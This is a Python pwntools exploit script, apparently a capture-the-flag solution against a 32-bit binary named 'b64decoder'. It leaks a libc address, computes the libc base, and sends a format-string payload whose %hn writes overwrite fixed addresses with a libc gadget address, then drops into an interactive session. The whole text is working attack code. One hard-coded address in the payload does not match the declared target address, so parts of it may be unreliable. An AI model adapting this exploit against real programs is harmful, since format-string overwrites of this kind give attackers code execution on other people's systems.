from pwn import *
target=process('./b64decoder')
context.terminal=["tmux","split","-h"]
libc=ELF('/lib32/libc.so.6')
print(target.recvuntil("a64l (0x"))
libc_a64l=target.recvn(8)
print(libc_a64l)
print(target.recvuntil("name!"))
a64l_offset=(libc.symbols['a64l'])
print(hex(a64l_offset))
libc_base=(int(libc_a64l,16)-a64l_offset)
print(hex(libc_base))
target_addr1=0x0804b3a8
target_addr3=0x0804b3aa
addr_to_write=hex(libc_base+0x13952b)
print(addr_to_write)
b1=int(addr_to_write[6:10],16)
b3=int(addr_to_write[2:6],16)
print(b1)
print(b3)
if (b1>b3):
    name="\xa8\x63\x04\x08\xaa\xb3\x04\x08"+"%0"+str(b1-8)+"x"+"%71$hn"+"%0"+str(65536+b3-b1-8)+"x"+"%72$hn"
else:
    name="\xa8\x63\x04\x08\xaa\xb3\x04\x08"+"%0"+str(b1-8)+"x"+"%71$hn"+"%0"+str(b3-b1-8)+"x"+"%72$hn"

print(name)
target.sendline(name)
target.interactive()

